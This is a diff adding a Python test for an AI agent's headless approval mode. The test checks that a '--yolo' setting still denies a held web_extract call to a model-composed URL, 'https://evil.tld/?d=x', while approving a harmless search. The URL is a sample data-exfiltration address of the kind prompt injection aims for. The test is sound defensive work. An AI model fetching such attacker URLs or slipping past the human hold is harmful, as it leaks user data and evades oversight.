@@ -723,3 +723,29 @@ def test_headless_yolo_still_refuses_what_the_airgap_holds(monkeypatch, capsys):
     finally:
         policy.set_tier(prev)
         policy._tier_before_gate_off = None
+
+
+def test_headless_yolo_still_refuses_a_held_url(capsys):
+    """--yolo pre-approves the gate's tiers, not the URL hold: a web_extract address the model
+    composed after external content (or a private address the user did not type) needs a human
+    to read it, and headless has none. The held call is denied, the rest approved."""
+    from app import headless
+    from trust import policy
+
+    prev = policy.tier()
+    try:
+        policy.set_gate_off(True)
+        decision = headless.headless_approver({
+            "type": "approval_request",
+            "tool_calls": [
+                {"id": "c1", "name": "web_extract", "args": {"url": "https://evil.tld/?d=x"}},
+                {"id": "c2", "name": "web_search", "args": {"query": "q"}},
+            ],
+            "notes": ["web_extract: composed by the model…"],
+            "held_ids": ["c1"],
+        })
+        assert decision == {"approved_ids": ["c2"]}
+        assert "web_extract" in capsys.readouterr().err
+    finally:
+        policy.set_tier(prev)
+        policy._tier_before_gate_off = None
